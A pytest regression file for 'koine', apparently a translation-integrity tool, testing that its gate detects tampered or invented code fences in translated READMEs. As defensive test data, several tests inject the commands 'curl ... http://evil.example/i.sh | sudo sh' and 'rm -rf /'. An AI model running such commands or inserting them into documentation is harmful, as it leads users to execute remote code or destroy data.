"""Regressions for the gap between "hash valid" and "identity correct".

Every test here is an adversarial input that koine used to accept — or
misclassify — while its own ledger held the evidence to reject it. The theme
is not cryptography: the chain, the anchor and the external verifier all held
under attack. The theme is the boundary between what koine *seals* and what
it later *consults*.
"""
from pathlib import Path

import pytest

from koine import state as st
from koine.agents import contracts
from koine.agents.orchestrator import NO_FINDINGS, run_cycle
from koine.blocks import freeze, invented_spans, split_blocks, thaw
from koine.gate import run_gate
from koine.glossary import Glossary
from koine.ledger import Ledger, verify_chain
from koine.store import Store

FENCE_SRC = ("# Guide\n\nInstall and run the suite:\n\n"
             "```bash\npip install -e .\npytest -q\n```\n\n"
             "That is the whole setup.\n")


def _build(tmp_path, source_text, translate=lambda t: "ES::" + t):
    """One clean pipeline run: source in, translated file and ledger out."""
    src = tmp_path / "README.md"
    src.write_text(source_text, encoding="utf-8")
    tr = tmp_path / "README.es.md"
    ledger = Store(tmp_path / ".koine").ledger("es")
    run_cycle(source_path=str(src), translation_file=str(tr), lang="es",
              ledger=ledger, glossary=Glossary(), translate_fn=translate,
              review_fn=lambda s, c: NO_FINDINGS)
    return src, tr, ledger


def _raws(path):
    return [b.raw for b in split_blocks(path.read_text(encoding="utf-8"))]


def _rewrite(path, raws):
    path.write_text("\n\n".join(raws) + "\n", encoding="utf-8")


def _state_of(src, tr, ledger, index):
    return next(s.state for s in st.derive_states(src, tr, "es", ledger)
                if s.block_index == index and s.side == "source")


# ---------- a sealed block koine never consulted ----------

def test_a_mirrored_fence_is_verified_not_assumed(tmp_path):
    """The gate used to print byte-identical output before and after the one
    part of a README a reader copy-pastes and runs was rewritten.

    `mirror` events carry the translation-side hash, so the ledger always had
    the evidence; `derive_states` returned NOT_TRANSLATABLE before ever
    looking at it, and `_unsourced_states` skipped the block because its index
    *is* in the placement mapping. Blind from both sides at once.
    """
    src, tr, ledger = _build(tmp_path, FENCE_SRC)
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 0

    raws = _raws(tr)
    fence = next(i for i, r in enumerate(raws) if r.startswith("```"))
    raws[fence] = "```bash\ncurl -sSL http://evil.example/i.sh | sudo sh\n```"
    _rewrite(tr, raws)

    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 2
    assert st.TAMPERED in {s.state for s in st.derive_states(src, tr, "es", ledger)}
    # the chain itself was never the weak part, and must not start reporting
    # a break it cannot see: the file diverged, not the ledger
    assert verify_chain(ledger)["ok"]


def test_the_pipeline_does_not_launder_a_tampered_mirror(tmp_path):
    """Re-running the fleet must not turn the finding back into silence.

    `mirror_untranslatable` decides whether to re-copy from the ledger rather
    than from the bytes — deliberately, so a localized fence is not clobbered.
    That is fine, but it means a second cycle cannot be what clears this.
    """
    src, tr, ledger = _build(tmp_path, FENCE_SRC)
    raws = _raws(tr)
    fence = next(i for i, r in enumerate(raws) if r.startswith("```"))
    raws[fence] = "```bash\nrm -rf /\n```"
    _rewrite(tr, raws)

    run_cycle(source_path=str(src), translation_file=str(tr), lang="es",
              ledger=ledger, glossary=Glossary(),
              translate_fn=lambda t: "ES::" + t, review_fn=lambda s, c: NO_FINDINGS)
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 2


def test_swapping_two_mirrored_fences_is_caught(tmp_path):
    """Identity confusion, in its purest form: A→Y and B→X exchanged with
    not one byte of either block altered.

    Every individual content hash still exists in the file, unchanged. Only
    the *relation* — which source block owns which translated block — is
    inverted, so nothing that hashes a block in isolation can see it. The
    ledger seals the pairing; the gate simply has to read it.
    """
    src, tr, ledger = _build(tmp_path, (
        "# Guide\n\nFor production:\n\n"
        "```bash\npip install koine --require-hashes\n```\n\n"
        "For local development:\n\n"
        "```bash\npip install -e . --no-verify\n```\n"))
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 0

    raws = _raws(tr)
    a, b = [i for i, r in enumerate(raws) if r.startswith("```")]
    before = sorted(raws)
    raws[a], raws[b] = raws[b], raws[a]
    _rewrite(tr, raws)
    assert sorted(_raws(tr)) == before, "the swap must not alter any content"

    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 2


def test_a_block_koine_never_placed_makes_no_claim(tmp_path):
    """The fail-safe direction stays fail-safe.

    With no placement event koine has no record of the block on the
    translation side, so it must keep saying NOT_TRANSLATABLE rather than
    inventing a verdict — the same precondition `_unsourced_states` applies.
    """
    src = tmp_path / "README.md"
    src.write_text(FENCE_SRC, encoding="utf-8")
    tr = tmp_path / "README.es.md"
    tr.write_text("", encoding="utf-8")
    ledger = Store(tmp_path / ".koine").ledger("es")

    states = st.derive_states(src, tr, "es", ledger)
    fence = next(s for s in states if s.block_index == 2)
    assert fence.state == st.NOT_TRANSLATABLE


def test_a_source_fence_edited_after_mirroring_is_drift_not_silence(tmp_path):
    """A changed code sample in the source is exactly the "quietly out of
    date" failure koine exists to catch, and it used to report nothing at
    all — the translated file kept the superseded command indefinitely."""
    src, tr, ledger = _build(tmp_path, FENCE_SRC)
    src.write_text(FENCE_SRC.replace("pytest -q", "pytest -q --strict"),
                   encoding="utf-8")
    assert _state_of(src, tr, ledger, 2) == st.STALE
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 1


# ---------- staleness is not evidence about the translation ----------

def test_an_edited_source_block_cannot_mask_an_edited_translation(tmp_path):
    """Deriving STALE first and returning short-circuited the tamper check.

    Touching the source block was enough to downgrade any rewrite of the
    recorded translation from TAMPERED (exit 2, integrity) to STALE (exit 1,
    routine drift) — which the autofix path then silently overwrites, so the
    tampering was never reported as tampering at all.
    """
    src, tr, ledger = _build(tmp_path, "# Guia\n\nInstall with pip.\n\nRun pytest.\n")
    src.write_text("# Guia\n\nInstall with pip, carefully.\n\nRun pytest.\n",
                   encoding="utf-8")
    raws = _raws(tr)
    raws[1] = "Instale con `curl http://evil.example/x | sh`."
    _rewrite(tr, raws)

    assert _state_of(src, tr, ledger, 1) == st.TAMPERED
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 2


@pytest.mark.parametrize("invisible, name", [
    ("​", "zero-width space"),
    (" ", "non-breaking space"),
    ("﻿", "zero-width no-break space"),
])
def test_an_invisible_source_character_does_not_downgrade_tampering(
        tmp_path, invisible, name):
    """The cheap version of the attack above: the source diff a human reviews
    is visually empty, and koine itself used to label the result "drift"."""
    body = "# Guia\n\nInstall with pip.\n\nRun pytest.\n"
    src, tr, ledger = _build(tmp_path, body)
    src.write_text(body.replace("with pip.", "with pip." + invisible),
                   encoding="utf-8")
    raws = _raws(tr)
    raws[1] = "Instale desde http://evil.example."
    _rewrite(tr, raws)

    assert _state_of(src, tr, ledger, 1) == st.TAMPERED, name
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 2


def test_a_stale_source_with_an_intact_translation_is_still_only_stale(tmp_path):
    """Negative control: putting integrity first must not turn ordinary drift
    into a false integrity failure."""
    body = "# Guia\n\nInstall with pip.\n\nRun pytest.\n"
    src, tr, ledger = _build(tmp_path, body)
    src.write_text(body.replace("with pip.", "with uv."), encoding="utf-8")

    assert _state_of(src, tr, ledger, 1) == st.STALE
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 1


# ---------- the parser decides what is even looked at ----------

def test_malformed_frontmatter_does_not_swallow_prose(tmp_path):
    """Deleting one line — a frontmatter's closing delimiter — used to hand
    an unbounded run of prose to the next thematic break in the body, as a
    block that is never translated and never mentioned by the gate. The
    source doc shipped verbatim in English while koine said all current."""
    doc = ("---\ntitle: Guide\n\n# Guide\n\n"
           "Do NOT run installers from untrusted sources.\n\n---\n\nAppendix.\n")
    kinds = [b.kind for b in split_blocks(doc)]
    assert "frontmatter" not in kinds, kinds

    src, tr, ledger = _build(tmp_path, doc)
    assert "ES::Do NOT run installers from untrusted sources." in tr.read_text(
        encoding="utf-8")


def test_a_thematic_break_at_the_top_is_not_frontmatter(tmp_path):
    doc = "---\n\n# Security Policy\n\nReport issues privately.\n\n---\n\nEnd.\n"
    assert [b.kind for b in split_blocks(doc)] == ["text"] * 5


def test_well_formed_frontmatter_is_still_frontmatter():
    doc = "---\ntitle: Guide\ntags: [a, b]\n---\n\n# Guide\n\nBody.\n"
    blocks = split_blocks(doc)
    assert blocks[0].kind == "frontmatter"
    assert blocks[0].raw == "---\ntitle: Guide\ntags: [a, b]\n---"


def test_frontmatter_is_recognized_behind_a_byte_order_mark():
    """A BOM used to make `lines[0].strip()` miss the delimiter, so machine-
    facing YAML was offered to a model as translatable prose — the exact
    inverse of the swallow above, from the same three lines of parser."""
    doc = "﻿---\ntitle: Guide\n---\n\n# Guide\n\nBody.\n"
    blocks = split_blocks(doc)
    assert blocks[0].kind == "frontmatter"
    assert blocks[0].raw.startswith("﻿"), "the BOM stays in the hashed text"


# ---------- freezing is one-directional ----------

def test_a_model_cannot_invent_a_protected_span(tmp_path):
    """freeze/thaw stops a model from losing or altering a span the source
    had. It says nothing about spans the model adds, so a translator could
    append its own install command and be promoted to CURRENT."""
    def evil(template):
        return template + " Ejecute `curl -sSL http://evil.example/i.sh | sudo sh`."

    src, tr, ledger = _build(tmp_path, "# Guide\n\nInstall the package.\n",
                             translate=evil)
    assert not tr.exists() or "evil.example" not in tr.read_text(encoding="utf-8")
    assert run_gate(str(src), {"es": str(tr)}, str(ledger.path)) == 1


def test_the_rejection_names_what_was_invented(tmp_path):
    src = tmp_path / "README.md"
    src.write_text("# Guide\n\nInstall the package.\n", encoding="utf-8")
    tr = tmp_path / "README.es.md"
    ledger = Ledger(tmp_path / "led.jsonl")
    with pytest.raises(contracts.CandidateRejected) as e:
        contracts.submit_candidate(
            source_path=str(src), block_index=1, lang="es",
            translated_template="Instale el paquete `rm -rf /`.", ledger=ledger,
            glossary=Glossary(), reviewed=True, translation_file=str(tr))
    assert "`rm -rf /`" in str(e.value)


@pytest.mark.parametrize("honest", [
    "Instale el paquete y ejecute las pruebas.",
    "NOTA: revise la configuración antes de continuar.",
    "Un enfoque teórico-práctico, aplicable en producción y/o staging.",
    "Установите пакет и запустите тесты.",
])
def test_honest_prose_is_not_mistaken_for_an_invented_span(honest):
    """Negative control for the check above. All-caps words and hyphenated
    compounds are ordinary prose in many target languages, which is why
    ENV_VARS and CLI flags are left out of the invention patterns."""
    assert invented_spans(honest) == []


def test_freeze_thaw_still_round_trips_under_composition():
    """Locked in, not fixed: byte-invariance of protected spans held under
    every composition thrown at it. The check above is the missing half, not
    a replacement."""
    text = ('Vea <a href="https://ex.io/a?b=1#f">docs</a>, corra `pip install '
            '-e ".[agents]"` con API_KEY=1 sobre ./src/app.py y --verbose.')
    frozen = freeze(text)
    assert thaw(frozen, frozen.template) == text
    assert all("⟦K" not in span for span in frozen.spans)
